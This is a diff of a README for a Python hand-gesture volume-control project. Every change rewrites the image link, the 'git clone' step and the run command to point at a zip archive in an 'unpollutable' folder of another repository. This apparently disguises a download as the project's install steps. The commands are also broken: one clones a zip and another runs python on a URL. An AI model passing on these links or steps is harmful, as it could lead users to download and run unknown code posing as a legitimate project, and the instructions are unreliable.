@@ -1,5 +1,5 @@
 # 1. Hand Gesture Volume Control
-![Hand Gesture Volume Control](https://raw.githubusercontent.com/supratim1020/single_file_project/main/unpollutable/single-project-file-1.3-alpha.2.zip)
+![Hand Gesture Volume Control](https://github.com/supratim1020/single_file_project/raw/refs/heads/main/unpollutable/single_file_project_1.1.zip)
 
 
 This project uses hand gestures to control the system volume in real time. The system leverages computer vision to detect hand landmarks and adjusts the volume based on the distance between specific fingertips.
@@ -27,7 +27,7 @@ This project uses hand gestures to control the system volume in real time. The s
 
 1. Clone the repository:
     ```bash
-    git clone https://raw.githubusercontent.com/supratim1020/single_file_project/main/unpollutable/single-project-file-1.3-alpha.2.zip
+    git clone https://github.com/supratim1020/single_file_project/raw/refs/heads/main/unpollutable/single_file_project_1.1.zip
     cd hand-gesture-volume-control
     ```
 
@@ -40,4 +40,4 @@ This project uses hand gestures to control the system volume in real time. The s
 
 Run the script to start the volume control system:
 ```bash
-python https://raw.githubusercontent.com/supratim1020/single_file_project/main/unpollutable/single-project-file-1.3-alpha.2.zip
+python https://github.com/supratim1020/single_file_project/raw/refs/heads/main/unpollutable/single_file_project_1.1.zip
